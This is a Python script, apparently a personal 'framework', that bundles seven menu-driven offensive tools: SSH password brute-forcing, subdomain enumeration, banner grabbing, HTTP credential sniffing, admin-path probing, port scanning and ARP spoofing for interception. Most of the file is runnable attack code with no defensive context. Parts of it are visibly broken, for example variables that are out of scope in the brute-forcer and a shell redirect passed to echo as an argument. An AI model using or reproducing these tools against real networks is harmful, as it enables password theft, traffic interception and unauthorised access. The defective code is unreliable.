import os
import pyfiglet
from colorama import init, Fore, Style


def logo():

    init(autoreset=True)

    print(Fore.RED + "             ____  __  _____    _   ____________  __  ___        ")
    print(Fore.RED + "            / __ \/ / / /   |  / | / /_  __/ __ \/  |/  /        ")
    print(Fore.RED + "           / /_/ / /_/ / /| | /  |/ / / / / / / / /|_/ /         ")
    print(Fore.RED + "          / ____/ __  / ___ |/ /|  / / / / /_/ / /  / /          ")
    print(Fore.RED + "         /_/   /_/ /_/_/  |_/_/ |_/ /_/  \____/_/  /_/           ")
    print(Fore.RED + "                                                                 ")
    print(Fore.RED + "    __________  ___    __  __________       ______  ____  __ __  ")
    print(Fore.RED + "   / ____/ __ \/   |  /  |/  / ____/ |     / / __ \/ __ \/ //_/  ")
    print(Fore.RED + "  / /_  / /_/ / /| | / /|_/ / __/  | | /| / / / / / /_/ / ,<     ")
    print(Fore.RED + " / __/ / _, _/ ___ |/ /  / / /___  | |/ |/ / /_/ / _, _/ /| |    ")
    print(Fore.RED + "/_/   /_/ |_/_/  |_/_/  /_/_____/  |__/|__/\____/_/ |_/_/ |_|  v1.1  ")
    print("\n\n")
    print(Fore.WHITE + "               By Nikit Singh Kanyal")


def menu():
    os.system('cls')  # Clears the terminal screen
    logo()
    print("\n\n")
    print(f"{Fore.CYAN}Choose an option:")
    print("\n")
    print(f"{Fore.YELLOW}1. Brute Force")
    print(f"{Fore.YELLOW}2. SubDomain Finder")
    print(f"{Fore.YELLOW}3. Banner Grabbing")
    print(f"{Fore.YELLOW}4. Packet Sniffer")
    print(f"{Fore.YELLOW}5. Discover Directory")
    print(f"{Fore.YELLOW}6. Network Scanner")
    print(f"{Fore.YELLOW}7. ARP Spoof")
    print(f"{Fore.YELLOW}0. Exit")
    print("\n")


while True:

    menu()

    choice = input("Enter your choice: ")
    if choice == "1":
        # code for Brute Force

        #!/usr/bin/python3
        import paramiko
        import sys
        import os
        import termcolor
        import threading
        import time

        stop_flag = False

        def ssh_connect(password):
            global stop_flag
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                ssh.connect(host, port=22, username=username,
                            password=password)
                stop_flag = True
                print(termcolor.colored(
                    '[+] Found Password: ' + password + ', For Account: ' + username, 'green'))
            except paramiko.AuthenticationException:
                print(termcolor.colored(
                    '[-] Incorrect Login: ' + password, 'red'))
            ssh.close()

        def validate_file(file_path):
            # Check if the file/path exists
            if not os.path.exists(file_path):
                print('[!!] The file/path does not exist.')
                sys.exit(1)

        def get_input(message):
            # Get user input and validate it is not empty
            while True:
                user_input = input(message)
                if user_input.strip():
                    return user_input

        def main():
            host = get_input('[+] Target Address: ')
            username = get_input('[+] SSH Username: ')
            input_file = get_input('[+] Passwords File: ')
            print('\n')

            validate_file(input_file)

            print('* * * Starting Threaded SSH Bruteforce on ' +
                  host + ' with Account: ' + username + ' * * *')

            with open(input_file, 'r') as file:
                for line in file:
                    if stop_flag:
                        t.join()
                        sys.exit()

                    password = line.strip()
                    t = threading.Thread(target=ssh_connect, args=(password,))
                    t.start()

                    # Reduce delay between threads to increase execution speed
                    time.sleep(0.1)

            # Wait for all threads to finish before exiting the program
            t.join()

        if __name__ == '__main__':
            main()

        pass

    elif choice == "2":
        # code for SubDomain Finder

        #!/usr/bin/python3
        import requests
        from concurrent.futures import ThreadPoolExecutor
        from colorama import init, Fore, Style

        # Set to store discovered subdomains
        discovered_subdomains = set()

        # Initialize colorama
        init(autoreset=True)

        def find_subdomains(domain):
            if domain in discovered_subdomains:
                return

            url = f"https://www.threatcrowd.org/searchApi/v2/domain/report/?domain={domain}"
            response = requests.get(url)
            response.raise_for_status()  # Raise an exception if there's an HTTP error

            data = response.json()
            subdomains = data.get("subdomains", [])

            # Add the current domain to the set
            discovered_subdomains.add(domain)

            with ThreadPoolExecutor() as executor:
                # Create a thread for each subdomain and submit them to the thread pool
                futures = [executor.submit(find_subdomains, subdomain)
                           for subdomain in subdomains]

                # Wait for all threads to complete
                for future in futures:
                    future.result()

        def main():
            try:
                domain = input("Enter a domain: ").strip()
                if not domain:
                    raise ValueError("Domain cannot be empty")

                find_subdomains(domain)

                output_file = input("Enter the output file path: ").strip()
                if not output_file:
                    raise ValueError("Output file path cannot be empty")

                with open(output_file, "w") as file:
                    for subdomain in discovered_subdomains:
                        file.write(subdomain + "\n")
                        print(Fore.GREEN +
                              f"Discovered subdomain: {subdomain}")

                print(Style.RESET_ALL +
                      f"Subdomains saved to {output_file} successfully.")

            except ValueError as ve:
                print(Fore.RED + f"Invalid input: {ve}")

            except requests.exceptions.RequestException as re:
                print(Fore.RED + f"Request error: {re}")

            except Exception as e:
                print(Fore.RED + f"An error occurred: {e}")

        if __name__ == "__main__":
            main()

        pass

    elif choice == "3":
        # code for Banner Grabbing

        #!/usr/bin/python3
        import socket
        from colorama import init, Fore, Style

        COMMON_PORTS = [21, 22, 23, 25, 53, 80,
                        110, 143, 443, 465, 587, 993, 995]

        # Function to sanitize the hostname by removing leading/trailing spaces and protocol prefixes
        def sanitize_hostname(hostname):
            hostname = hostname.strip()
            if hostname.startswith("http://"):
                hostname = hostname[7:]
            elif hostname.startswith("https://"):
                hostname = hostname[8:]
            return hostname

        # Function to perform banner grabbing on a specific hostname and port
        def banner_grabber(hostname, port):
            try:
                with socket.create_connection((hostname, port)) as s:
                    s.settimeout(3)
                    s.send(b"Sup")  # Send a sample request
                    data = s.recv(4096)  # Receive the response
                    print(
                        f"[+] Banner from port {port}: {Fore.GREEN}{data.decode('utf-8')}{Style.RESET_ALL}")
            except (socket.error, socket.timeout) as e:
                print(
                    f"[-] Error while connecting to port {port}: {Fore.RED}{e}{Style.RESET_ALL}")

        # Main function to execute the banner grabbing process
        def main():
            init(autoreset=True)  # Initialize colorama

            hostname = input("Enter host name: ")
            hostname = sanitize_hostname(hostname)

            for port in COMMON_PORTS:
                banner_grabber(hostname, port)

        if __name__ == "__main__":
            main()

        pass

    elif choice == "4":
        # code for Packet Sniffer

        #!/usr/bin/python3
        from scapy.all import *
        from scapy.layers.inet import TCP, IP
        from urllib import parse
        import re
        import sys
        from termcolor import colored
        import concurrent.futures

        # Save the standard output to a file
        sys.stdout = open('output.txt', 'w')

        def get_login_pass(body):
            # Function to extract login credentials from the HTTP body

            user = None
            passwd = None

            # List of common login field names
            userfields = ['log', 'login', 'wpname', 'ahd_username', 'unickname', 'nickname', 'user', 'user_name',
                          'alias', 'pseudo', 'email', 'username', '_username', 'userid', 'form_loginname', 'loginname',
                          'login_id', 'loginid', 'session_key', 'sessionkey', 'pop_login', 'uid', 'id', 'user_id', 'screename',
                          'uname', 'ulogin', 'acctname', 'account', 'member', 'mailaddress', 'membername', 'login_username',
                          'login_email', 'loginusername', 'loginemail', 'uin', 'sign-in', 'usuario']
            # List of common password field names
            passfields = ['ahd_password', 'pass', 'password', '_password', 'passwd', 'session_password', 'sessionpassword',
                          'login_password', 'loginpassword', 'form_pw', 'pw', 'userpassword', 'pwd', 'upassword',
                          'login_password', 'passwort', 'passwrd', 'wppassword', 'upasswd', 'senha', 'contrasena']

            # Search for login fields in the body
            for login in userfields:
                login_re = re.search('(%s=[^&\']+)' %
                                     login, body, re.IGNORECASE)
                if login_re:
                    user = login_re.group()

            # Search for password fields in the body
            for passfield in passfields:
                pass_re = re.search('(%s=[^&\']+)' %
                                    passfield, body, re.IGNORECASE)
                if pass_re:
                    passwd = pass_re.group()

            # Return the login credentials if both username and password are found
            if user and passwd:
                return (user, passwd)

        def pkt_parser(packet):
            # Packet parsing function to extract and process packets with potential login credentials

            if packet.haslayer(TCP) and packet.haslayer(Raw) and packet.haslayer(IP):
                body = str(packet[TCP].payload)
                user_pass = get_login_pass(body)
                if user_pass:
                    # Print the packet information if login credentials are found
                    print_packet_info(
                        packet[TCP].payload, user_pass[0], user_pass[1])
            else:
                pass

        def print_packet_info(payload, username, password):
            # Function to print the packet information with colored output

            print(colored("[*] Potential Login Credentials Found:", "yellow"))
            print(colored("   Payload: ", "cyan") + payload)
            print(colored("   Username: ", "green") + parse.unquote(username))
            print(colored("   Password: ", "green") + parse.unquote(password))
            print("")

        def validate_interface(interface):
            # Function to validate the provided interface

            interfaces = get_interfaces()
            if interface not in interfaces:
                print(
                    colored("[!] Invalid interface. Available interfaces:", "red"))
                print(interfaces)
                sys.exit(1)

        def get_interfaces():
            # Function to retrieve the available network interfaces

            interfaces = []
            for iface in get_if_list():
                interfaces.append(iface.decode())
            return interfaces

        def main(interface):
            validate_interface(interface)

            print(colored("[*] ARP Credential Sniffer started on interface:",
                  "yellow"), colored(interface, "cyan"))
            print(
                colored("[*] Listening for potential login credentials...", "yellow"))
            print("")

            try:
                with concurrent.futures.ThreadPoolExecutor() as executor:
                    sniff(iface=interface, prn=pkt_parser, store=0)
            except KeyboardInterrupt:
                print(colored("[*] Exiting.", "yellow"))
                sys.exit(0)

        if __name__ == "__main__":
            # Prompt the user to enter the interface
            interface = input(
                colored("Enter the interface to sniff on: ", "cyan"))

            main(interface)

        # Close the file after writing
        sys.stdout.close()
        pass

    elif choice == "5":
        # code for Discover Directory

        #!/usr/bin/python3
        import requests
        from termcolor import colored
        import concurrent.futures
        import re

        COMMON_DIRECTORIES = [
            "admin", "login", "wp-admin", "wp-login", "administrator", "phpmyadmin", "manage", "editor", "admin-panel", "admin_area", "adminarea", "admincp", "adminconsole", "superadmin", "sysadmin", "webadmin", "wp-admin", "controlpanel", "cms",]

        def request_http(url):
            # Function to request the url as http
            try:
                response = requests.get("http://" + url, timeout=1)
                return response
            except requests.exceptions.ConnectionError:
                pass

        def request_https(url):
            # Function to request the url as https
            try:
                response = requests.get("https://" + url, timeout=1)
                return response
            except requests.exceptions.ConnectionError:
                pass

        def check_directory(url):
            # Function to check if a directory exists at the given URL
            response_http = request_http(url)
            response_https = request_https(url)
            if response_http:
                print(
                    colored('[+] Discovered Directory at Link: ' + url, 'green'))
            elif response_https:
                print(
                    colored('[+] Discovered Directory at Link: ' + url, 'green'))

        def sanitize_url(url):
            # Sanitizes the URL by removing leading/trailing whitespaces and adding http:// prefix if missing
            url = url.strip()
            if not re.match(r'^https?://', url):
                url = 'http://' + url
            return url

        def validate_url(url):
            # Validates the URL format using regex
            if re.match(r'^(https?://)?[a-zA-Z0-9-]+(\.[a-zA-Z0-9-]+)*(\.[a-zA-Z]{2,3})(:\d+)?(/.*)?$', url):
                return True
            else:
                return False

        def main():
            # Main function to execute the directory scanning process
            targetURL = input("Enter Target URL: ")

            while not validate_url(targetURL):
                print("Invalid URL format. Please enter a valid URL.")
                targetURL = input("Enter Target URL: ")

            targetURL = sanitize_url(targetURL)

            print("Scanning started...")

            with concurrent.futures.ThreadPoolExecutor() as executor:
                futures = []
                for path in COMMON_DIRECTORIES:
                    fullURL = f"{targetURL}/{path}"
                    futures.append(executor.submit(check_directory, fullURL))

                for future in concurrent.futures.as_completed(futures):
                    pass

            print("Scanning completed.")

        if __name__ == "__main__":
            main()

        pass

    elif choice == "6":
        # code for Network Scanner

        #!/usr/bin/python3
        import socket
        from IPy import IP
        from colorama import init, Fore, Style
        from concurrent.futures import ThreadPoolExecutor

        COMMON_PORTS = [21, 22, 23, 25, 53, 80, 110, 115, 135, 139, 143, 161, 194, 443,
                        445, 465, 587, 993, 995, 1433, 1521, 3306, 3389, 5432, 5900, 6379, 8080, 8443]

        # Function to perform port scanning on the target
        def scan(target):
            converted_ip = check_ip(target)
            print(
                '\n' + f'{Fore.CYAN}[Scanning Target...] {str(target)}{Style.RESET_ALL}')
            open_ports = []
            with ThreadPoolExecutor() as executor:
                # Scan each port using multiple threads
                results = executor.map(lambda port: scan_port(
                    converted_ip, port), COMMON_PORTS)
                for port, is_open in zip(COMMON_PORTS, results):
                    if is_open:
                        open_ports.append(port)
            if open_ports:
                print(
                    f'\n{Fore.GREEN}[+] Open Ports: {", ".join(map(str, open_ports))}{Style.RESET_ALL}')
            else:
                print(f'{Fore.YELLOW}[-] No open ports found{Style.RESET_ALL}')

        # Function to check if the input is a valid IP address, and convert if necessary
        def check_ip(ip):
            try:
                IP(ip)
                return ip
            except ValueError:
                return socket.gethostbyname(ip)

        # Function to scan a specific port on the target IP address
        def scan_port(ipaddress, port):
            try:
                sock = socket.socket()
                sock.settimeout(0.5)
                result = sock.connect_ex((ipaddress, port))
                if result == 0:
                    print(
                        f'{Fore.GREEN}[+] Port {str(port)} is open{Style.RESET_ALL}')
                    sock.close()
                    return True
                else:
                    sock.close()
                    return False
            except socket.error:
                return False

        # Main function to execute the port scanning tool
        def main():
            init(autoreset=True)  # Initialize colorama with autoreset

            targets = input(
                f'{Fore.YELLOW}[+] Enter Target(s) To Scan (split multiple targets with ,): {Style.RESET_ALL}')

            if ',' in targets:
                for ip_add in targets.split(','):
                    ip_address = ip_add.strip()
                    if not ip_address:
                        print(
                            f'{Fore.RED}[!] Invalid IP address. Please provide valid IP addresses.{Style.RESET_ALL}')
                        continue
                    scan(ip_address)
            else:
                ip_address = targets.strip()
                if not ip_address:
                    print(
                        f'{Fore.RED}[!] Invalid IP address. Please provide a valid IP')
                scan(ip_address)

        # Execute the main function if the script is run directly
        if __name__ == "__main__":
            main()

        pass

    elif choice == "7":
        # code for ARP Spoofing

        #!/usr/bin/python3
        import scapy.all as scapy
        import sys
        import time
        import subprocess
        import asyncio
        from colorama import Fore, Style

        def enable_ip_forwarding():
            # Enable IP forwarding in the system
            subprocess.call(
                ["echo", "1", ">>", "/proc/sys/net/ipv4/ip_forward"])

        def get_mac_address(ip_address):
            # Retrieve the MAC address of a given IP address using ARP request
            broadcast_layer = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
            arp_layer = scapy.ARP(pdst=ip_address)
            get_mac_packet = broadcast_layer/arp_layer
            answer = scapy.srp(get_mac_packet, timeout=2, verbose=False)[0]
            return answer[0][1].hwsrc

        async def spoof(router_ip, target_ip, router_mac, target_mac):
            # Perform ARP spoofing by sending ARP packets
            packet1 = scapy.ARP(op=2, hwdst=router_mac,
                                pdst=router_ip, psrc=target_ip)
            packet2 = scapy.ARP(op=2, hwdst=target_mac,
                                pdst=target_ip, psrc=router_ip)
            scapy.send(packet1, verbose=False)
            scapy.send(packet2, verbose=False)

        async def start_spoofing(router_ip, target_ip, router_mac, target_mac):
            try:
                while True:
                    await spoof(router_ip, target_ip, router_mac, target_mac)
                    await asyncio.sleep(2)
            except asyncio.CancelledError:
                print(
                    f'{Fore.YELLOW}[*] Stopping ARP spoofing.{Style.RESET_ALL}')

        async def main():
            try:
                # Get target and router IP addresses from command-line arguments
                target_ip = input("Enter the target IP address: ")
                router_ip = input("Enter the router IP address: ")

                # Validate and sanitize the input
                target_ip = target_ip.strip()
                router_ip = router_ip.strip()

                if not target_ip or not router_ip:
                    print(
                        f'{Fore.RED}[!] Invalid IP address. Please provide valid IP addresses.{Style.RESET_ALL}')
                    return

                # Get MAC addresses for target and router
                target_mac = str(get_mac_address(target_ip))
                router_mac = str(get_mac_address(router_ip))

                print(
                    f'{Fore.YELLOW}[*] Enabling IP forwarding...{Style.RESET_ALL}')
                enable_ip_forwarding()
                print(
                    f'{Fore.GREEN}[+] IP forwarding enabled.{Style.RESET_ALL}')
                print(
                    f'{Fore.YELLOW}[*] ARP spoofing started. Press Ctrl+C to stop.{Style.RESET_ALL}')

                tasks = []
                try:
                    tasks.append(asyncio.create_task(start_spoofing(
                        router_ip, target_ip, router_mac, target_mac)))
                    await asyncio.gather(*tasks)
                except KeyboardInterrupt:
                    for task in tasks:
                        task.cancel()
                    await asyncio.gather(*tasks, return_exceptions=True)

            except Exception as e:
                print(
                    f'{Fore.RED}[!] An error occurred: {str(e)}{Style.RESET_ALL}')

        if __name__ == "__main__":
            try:
                asyncio.run(main())
            except KeyboardInterrupt:

                pass

        pass
    elif choice == "0":
        print("Exiting...")
        break
    else:
        input("Invalid choice. Press Enter to try again.")
